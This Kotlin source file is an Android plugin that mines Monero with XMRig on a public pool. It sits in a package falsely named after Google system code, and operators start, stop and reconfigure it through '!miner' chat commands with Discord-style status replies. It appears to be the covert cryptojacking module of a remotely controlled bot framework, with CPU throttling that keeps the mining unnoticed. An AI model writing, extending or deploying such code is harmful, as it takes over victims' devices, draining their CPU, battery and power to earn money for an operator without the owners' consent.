package com.google.system.plugins

import android.content.Context
import android.os.BatteryManager
import com.google.system.RealMiner
import kotlinx.coroutines.*

class MinerPlugin : Plugin {
    override val id = "miner"
    override val name = "Crypto Miner"
    override val version = "2.0"
    override val commands = listOf("!miner")
    override val description = "Real Monero (XMR) mining using XMRig"

    private var realMiner: RealMiner? = null
    private var isMining = false
    private var startTime = 0L
    private var wallet = ""
    private var pool = "pool.supportxmr.com:3333"
    private var maxThreads = 2
    private var maxCpuPercent = 40
    private var contextRef: Context? = null

    override fun onEnable(context: Context): Boolean {
        contextRef = context
        return try {
            val config = PluginManager.getPlugin(id)?.getConfig() ?: emptyMap()
            wallet = config["wallet"] as? String ?: ""
            pool = config["pool"] as? String ?: pool
            maxThreads = (config["threads"] as? Number)?.toInt() ?: 2
            maxCpuPercent = (config["max_cpu_percent"] as? Number)?.toInt() ?: 40
            true
        } catch (_: Exception) { false }
    }

    override fun onDisable() {
        stopMining()
    }

    override fun handleCommand(cmd: String, payload: String?): String? {
        val sub = payload?.trim()?.lowercase()
        return when {
            sub == null || sub.isBlank() -> getStatus()
            sub.startsWith("start") -> startMining()
            sub.startsWith("stop") -> { stopMining(); ":stop_button: Mining stopped" }
            sub.startsWith("status") -> getStatus()
            sub.startsWith("set_wallet") -> {
                val parts = payload.split(" ", limit = 2)
                if (parts.size > 1) {
                    wallet = parts[1]
                    ":white_check_mark: Wallet set"
                } else ":x: Usage: `!miner set_wallet <address>`"
            }
            sub.startsWith("set_pool") -> {
                val parts = payload.split(" ", limit = 2)
                if (parts.size > 1) {
                    pool = parts[1]
                    ":white_check_mark: Pool set"
                } else ":x: Usage: `!miner set_pool <url>`"
            }
            sub.startsWith("set_threads") -> {
                val n = payload.split(" ")[1].toIntOrNull()
                if (n != null && n in 1..8) {
                    maxThreads = n
                    ":white_check_mark: Threads set to $n"
                } else ":x: Usage: `!miner set_threads <1-8>`"
            }
            else -> null
        }
    }

    override fun getConfig(): Map<String, Any> {
        val status = realMiner?.getStatus()
        return mapOf(
            "mining" to isMining,
            "wallet" to wallet,
            "pool" to pool,
            "threads" to maxThreads,
            "max_cpu" to maxCpuPercent,
            "hashrate" to (status?.hashrate ?: 0.0),
            "shares_accepted" to (status?.sharesAccepted ?: 0),
            "shares_rejected" to (status?.sharesRejected ?: 0),
            "uptime" to if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 1000}s" else "0s"
        )
    }

    private fun startMining(): String {
        if (isMining) return ":warning: Already mining"
        if (wallet.isBlank()) return ":x: Set wallet first: `!miner set_wallet <address>`"
        if (contextRef == null) return ":x: Context not initialized"

        val poolParts = pool.split(":")
        val host = poolParts[0]
        val port = poolParts.getOrNull(1)?.toIntOrNull() ?: 3333

        realMiner = RealMiner(
            context = contextRef!!,
            wallet = wallet,
            poolHost = host,
            poolPort = port,
            maxThreads = maxThreads,
            onStatusUpdate = { status ->
                // Auto-update status on Discord if needed
            }
        )

        val result = realMiner?.start() ?: "Failed to initialize miner"
        if (result.contains("started", ignoreCase = true)) {
            isMining = true
            startTime = System.currentTimeMillis()
        }
        return result
    }

    fun stopMining() {
        isMining = false
        realMiner?.stop()
        realMiner = null
    }

    private fun getStatus(): String {
        val status = realMiner?.getStatus()
        val miningStatus = if (isMining) ":green_circle: MINING" else ":red_circle: STOPPED"
        val hashrate = status?.hashrate?.let { hr ->
            when {
                hr >= 1000 -> "${"%.2f".format(hr / 1000)} kH/s"
                else -> "${"%.2f".format(hr)} H/s"
            }
        } ?: "0 H/s"
        val uptime = if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 60000}m" else "0m"
        val shares = "${status?.sharesAccepted ?: 0} accepted / ${status?.sharesRejected ?: 0} rejected"
        val connected = if (status?.poolConnection == true) ":green_circle: Connected" else ":red_circle: Disconnected"

        return buildString {
            appendLine(":pick: **Miner Status** $miningStatus")
            appendLine()
            appendLine("Wallet: `${wallet.take(10)}...${wallet.takeLast(6)}`")
            appendLine("Pool: `$pool`")
            appendLine("Connection: $connected")
            appendLine("Threads: $maxThreads | Max CPU: ${maxCpuPercent}%")
            appendLine("Hashrate: $hashrate")
            appendLine("Shares: $shares")
            appendLine("Uptime: $uptime")
            if (status?.rawOutput?.isNotBlank() == true) {
                appendLine()
                appendLine("Last output: `${status.rawOutput.take(100)}`")
            }
        }
    }
}
